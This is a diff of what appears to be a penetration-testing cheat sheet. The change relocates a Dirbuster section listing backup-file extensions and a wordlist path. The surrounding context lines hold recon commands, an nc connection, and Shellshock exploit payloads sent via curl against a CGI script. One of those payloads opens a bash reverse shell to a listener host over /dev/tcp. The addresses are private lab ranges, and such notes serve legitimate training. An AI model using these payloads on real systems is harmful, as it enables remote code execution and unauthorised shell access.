@@ -10,6 +10,10 @@ theharvester -d microsoft.com -l 500 -b google -h myresults
 sublist3r -d google.com
 whatweb 
 whois <adress>
+--------------------------------------------
+#Dirbuster
+bak, backup, txt, copy, save, old, rar, zip, tar.gz, pdf
+wordlist = /usr/share/dirbuster/directory-list-2.3-medium.txt
 -------------------------------------------
 # Online Enum
 http://dnshistory.org/
@@ -166,11 +170,6 @@ nc -nv 10.11.25.59 4444
 curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.1.57/cgi-bin/test.sh
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.90.35/9999 0>&1' http://192.168.90.59/cgi-bin/test.sh --> reverse shell
 
-
---------------------------------------------
-#Dirbuster
-bak, backup, txt, copy, save, old, rar, zip, tar.gz, pdf
-wordlist = /usr/share/dirbuster/directory-list-2.3-medium.txt
 -------------------------------------------
 #hpp waf bypass 
 
